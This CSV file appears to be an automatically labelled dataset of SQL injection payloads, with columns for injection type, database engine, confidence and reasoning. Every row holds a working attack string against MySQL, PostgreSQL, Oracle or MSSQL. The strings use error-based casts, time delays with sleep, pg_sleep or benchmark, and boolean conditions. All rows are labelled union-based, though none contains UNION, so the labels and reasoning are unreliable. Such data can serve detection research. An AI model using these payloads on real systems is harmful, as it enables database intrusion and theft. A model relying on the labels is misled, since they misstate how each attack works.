id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1911,1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = ',union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1927,1' and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1938,"-3492"" where 4094 = 4094 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1941,"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""duuw"" = ""duuw",union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1942,1'+ ( select 'kicv' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +',union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
1945,"1', ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
1951,"-3856"" ) as iyzl where 7394 = 7394 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
1953,"-9456%"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1954,"-1168 ) ) as vlol where 3475 = 3475 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
1955,select ( case when ( 3681 = 5989 ) then 3681 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
1956,-9143 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
1957,"-8614' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
1958,1%' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( '%' = ',union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
1959,"1"" ) where 5814 = 5814 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
1963,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'gsjp' = 'gsjp,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
1987,"1 ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
1992,"-1868"" ) where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
1996,"-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""gkvy"" = ""gkvy",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
1818,select sleep ( 5 ) #,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
1829,1'|| ( select 'zccb' from dual where 8911 = 8911,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
1856,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""vcvb"" like ""vcvb",union_based,mysql,0.9,Signals: 'benchmark'; UNION-based payload detected; DB: mysql,0
1884,select case when 8975 = 2352 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
1904,select sleep ( 5 ) and ( ( 3404 = 3404,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
1905,1'|| ( select 'fjlg' from dual where 9517 = 9517,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
1913,select ( case when ( 7096 = 2568 ) then 7096 else 1/ ( select 0 ) end ) --,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 74 chars.,0
1925,select case when 9390 = 5752 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
1935,1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
1946,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( '%' = '",union_based,mysql,0.9,Signals: 'benchmark'; UNION-based payload detected; DB: mysql,0
1947,select case when 4176 = 6138 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
1952,"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
1965,"1%"" ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
1972,select case when 3252 = 9622 then 1 else null end--,union_based,generic,0.9,Signals: 'case'; UNION-based payload detected. Payload length: 51 chars.,0
1978,1'|| ( select 'aioq' from dual where 8176 = 8176,union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
1995,select sleep ( 5 ) -- waln,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
1812,1'+ ( select soqk where 5383 = 5383,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
1819,"1' where 7353 = 7353 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 91 chars.,0
1833,"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 72 chars.,0
1843,"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'zetf' = 'zetf",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 90 chars.,0
1866,1'|| ( select 'hwdj' where 8179 = 8179,union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,0
1873,1'+ ( select tzvm where 5145 = 5145 and 4192 = 7437#,union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,0
1881,1'|| ( select 'yuku' where 7480 = 7480,union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,0
1894,1'+ ( select 'njee' where 4101 = 4101 and 3090 = 7873 ) +',union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,0
1908,"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'jiyx' = 'jiyx",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 89 chars.,0
1962,1'+ ( select 'vnue' where 5807 = 5807,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
1970,1'+ ( select 'mquh' where 3933 = 3933,union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,0
1973,"select count ( * ) from generate_series ( 1,5000000 ) and ( 'cewn' = 'cewn",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 74 chars.,0
1983,"1'+ ( select bldn where 8321 = 8321 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 107 chars.,0
1991,1'+ ( select aqhj where 4419 = 4419,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
